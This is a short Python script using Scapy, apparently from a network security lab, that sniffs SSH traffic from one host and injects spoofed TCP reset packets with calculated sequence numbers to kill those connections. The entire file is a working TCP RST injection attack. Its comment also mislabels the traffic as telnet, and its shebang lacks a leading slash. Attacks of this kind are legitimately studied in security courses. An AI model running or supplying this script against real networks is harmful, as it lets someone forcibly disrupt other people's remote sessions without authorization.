'''TCP RST Attack [SSH]
This script sniffs for telnet traffic and performs TCP RST attack.

We need the following fields for this attack
- src IP, src port 
- dst IP, dst port
- seq no. (within rcv window)
'''

#!usr/bin/python3
from scapy.all import *

SELF_MAC='08:00:27:bc:f5:3d'

def drop_ssh(pkt):
	if pkt[Ether].src != SELF_MAC:
		I=IP(src=pkt[IP].src, dst=pkt[IP].dst)
		ip_len = pkt[IP].len
		ip_header_len = pkt[IP].ihl * 32 / 8
		tcp_header_len = pkt[TCP].dataofs * 32 / 8
		tcp_seg_len = ip_len - ip_header_len - tcp_header_len
			
		newseq=pkt[TCP].seq + tcp_seg_len
		T=TCP(seq=int(newseq),
			sport=pkt[TCP].sport,
			dport=pkt[TCP].dport,
			flags='R')
		send(I/T)
	
sniff(filter='tcp and src host 10.0.2.7 and dst port 22', prn=drop_ssh)
